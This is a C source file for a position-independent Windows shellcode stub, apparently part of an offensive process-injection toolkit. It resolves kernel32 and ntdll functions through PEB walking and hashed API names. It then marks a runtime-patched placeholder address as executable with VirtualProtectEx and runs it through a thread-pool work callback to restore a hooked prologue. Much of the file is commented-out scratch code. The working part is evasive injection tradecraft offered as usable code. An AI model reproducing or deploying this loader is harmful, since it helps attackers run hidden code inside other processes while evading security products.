#include <Core.h>
#include <Win32.h>
#include <stdint.h>
#include <stdbool.h>
SEC( text, B ) VOID Entry( VOID ) 
{
    INSTANCE Instance = { };

    Instance.Modules.Kernel32   = LdrModulePeb( HASH_KERNEL32 ); 
    Instance.Modules.Ntdll      = LdrModulePeb( HASH_NTDLL ); 
    
    if ( Instance.Modules.Kernel32 != NULL )
    {
        // Hashes were calculated with Scripts/Hasher tool
        Instance.Win32.WaitForSingleObject = LdrFunction( Instance.Modules.Kernel32, 0xdf1b3da );
        Instance.Win32.WaitForSingleObjectEx = LdrFunction( Instance.Modules.Kernel32, 0x512e1b97 );
        Instance.Win32.VirtualProtectEx = LdrFunction( Instance.Modules.Kernel32, 0x5b6b908a );
        //loader CreateProcessA
        Instance.Win32.CreateProcessA = LdrFunction( Instance.Modules.Kernel32, 0xfbaf90b9 );

        Instance.Win32.CreateEvent = LdrFunction( Instance.Modules.Kernel32, 0x68720cdb );
        Instance.Win32.CloseHandle = LdrFunction( Instance.Modules.Kernel32, 0xfdb928e7 );
    }
    

    if ( Instance.Modules.Ntdll != NULL )
    {
        // Hashes were calculated with Scripts/Hasher tool
        Instance.Win32.TpAllocWork = LdrFunction( Instance.Modules.Ntdll, 0x3fc58c37 );
        Instance.Win32.TpPostWork = LdrFunction( Instance.Modules.Ntdll, 0x4d915ab2 );
        Instance.Win32.TpReleaseWork = LdrFunction( Instance.Modules.Ntdll, 0x27a9ff4d );
    }

    // ------ Code ------

    // Create a notepad process: 
    // STARTUPINFOA sii;
    // PROCESS_INFORMATION pii;
    // BOOL result;

    // // Initialize the STARTUPINFOA structure
    // ZeroMemory(&sii, sizeof(sii));
    // sii.cb = sizeof(sii);

    // // Initialize the PROCESS_INFORMATION structure
    // ZeroMemory(&pii, sizeof(pii));

    // // Step 1: Create the Notepad process
    // result = Instance.Win32.CreateProcessA(
    //     "C:\\Windows\\System32\\notepad.exe", // Application name
    //     NULL,                                 // Command line arguments
    //     NULL,                                 // Process security attributes
    //     NULL,                                 // Thread security attributes
    //     FALSE,                                // Inherit handles
    //     0,                                    // Creation flags (0 means no special flags)
    //     NULL,                                 // Environment block
    //     NULL,                                 // Current directory
    //     &sii,                                  // Pointer to STARTUPINFOA structure
    //     &pii                                   // Pointer to PROCESS_INFORMATION structure
    // );
    // working with createProcessA
    // void shellcodeLength()
    // {
    //     asm(".byte 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11");
    // }


    // define dwMilliseconds:
    DWORD dwMilliseconds = 0x1000;
    // sleep for 1 second:
    Instance.Win32.WaitForSingleObject((HANDLE)-1, dwMilliseconds); // Wait for the specified duration

    // HANDLE hEvent = Instance.Win32.CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
    // if (hEvent != NULL)
    // {
    //     Instance.Win32.WaitForSingleObject(hEvent, dwMilliseconds); // Wait for the specified duration
    //     Instance.Win32.CloseHandle(hEvent); // Clean up the event object
    // }


    void magicAddress()
    {
        asm(".byte 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88");
    }
    // DWORD shellcodelength = *( (DWORD*)shellcodeLength );
    // DWORD shellcodelength = reinterpret_cast<DWORD>(&shellcodeLength);
    // PVOID magicEx = 0x1111111111111111;
    PVOID magicEx = *( (PVOID*)magicAddress );
    // PVOID magicEx = magicAddress;

    // Define a byte array with the desired value
    // uint8_t bytes[8] = { 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88 };
    
    // Create a PVOID variable
    // PVOID magicEx;

    // Copy the bytes into the PVOID variable
    // memcpy(&magicEx, bytes, sizeof(magicEx));
    
    // The restore prologue address - this is a place holder to be changed during runtime
    
    SIZE_T magicExSize = 0x1111111111111111;
    // // SIZE_T magicExSize = shellcodelength;
    // // // PVOID magicEx = 0xFFFFFFFFFFFFFFFF;
    DWORD oldProtect;
    // bool results = VirtualProtectEx((HANDLE)-1, magicEx, magicExSize, PAGE_EXECUTE_READ, &oldProtect);

    // BOOL isProtected = VirtualProtectEx((HANDLE)-1, magicEx, magicExSize, PAGE_EXECUTE_READ, &oldProtect);
    // print the result, 
    // std::cout << "VirtualProtectEx: " << isProtected << std::endl;

    bool results = Instance.Win32.VirtualProtectEx((HANDLE)-1, magicEx, magicExSize, PAGE_EXECUTE_READ, &oldProtect);

    // Creating our TpWorkCallback pointing it to our restore prologue address
    PTP_WORK WorkReturn = NULL;
    Instance.Win32.TpAllocWork( &WorkReturn, (PTP_WORK_CALLBACK)magicEx, NULL, NULL );
    Instance.Win32.TpPostWork( WorkReturn );
    Instance.Win32.TpReleaseWork( WorkReturn );

    // Waiting for 1 second to let the TpWorkCallback finish
    Instance.Win32.WaitForSingleObject( (HANDLE)-1, 0x1000 );

} 